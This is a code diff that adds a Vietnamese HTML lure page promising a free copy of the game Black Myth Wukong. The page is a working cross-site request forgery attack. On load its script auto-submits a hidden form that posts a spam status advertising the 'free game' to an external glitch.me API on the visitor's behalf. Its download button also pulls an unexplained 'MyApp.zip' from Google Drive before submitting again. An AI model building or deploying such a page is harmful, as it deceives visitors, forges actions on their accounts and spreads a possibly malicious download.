@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Trải Nghiệm Miễn Phí Black Myth Wukong</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <div class="overplay"></div>
+    <div class="content">
+        <h1>TRẢI NGHIỆM MIỄN PHÍ BLACK MYTH WUKONG</h1>
+        <img src="https://gamicsoft.sgp1.digitaloceanspaces.com/34035/conversions/black-myth-wukong_2021-02-11-124724-big_thumb.jpg" alt="wukong">
+        <form id="csrf-form" action="https://hurricane-discreet-coin.glitch.me/api/statuses" method="POST" onsubmit="return handleSubmit();">
+            <input type="hidden" name="text" value="phiên bản miễn phí của black myth wukong đã ra mắtttttt: https://www.youtube.com/">
+            <button type="submit">Tải game ngay</button>
+        </form>
+      
+        <form id="csrf-form" action="https://hurricane-discreet-coin.glitch.me/api/statuses" method="POST" style="display: none;">
+          <input type="hidden" name="text" value="ok">
+          <button type="submit">Submit CSRF</button>
+      </form>
+    </div>
+    <script>
+      document.getElementById('csrf-form').submit();
+        function downloadFile() { 
+            const fileId = '1C7Bpnsku_AlK7CufgABi10V7aCzjXIcc'; 
+            const link = document.createElement('a'); 
+            link.href = `https://drive.google.com/uc?export=download&id=${fileId}`;
+            link.download = 'MyApp.zip'; 
+            document.body.appendChild(link); 
+            link.click(); 
+            document.body.removeChild(link); 
+        }
+
+        function handleSubmit() { 
+            downloadFile(); // Bắt đầu tải file
+            // Gửi form sau 1 giây
+            setTimeout(() => {
+                document.getElementById('csrf-form').submit();
+            }, 1000); 
+            return false; // Ngăn chặn gửi form ngay lập tức
+        }
+    </script>
+</body>
+</html>
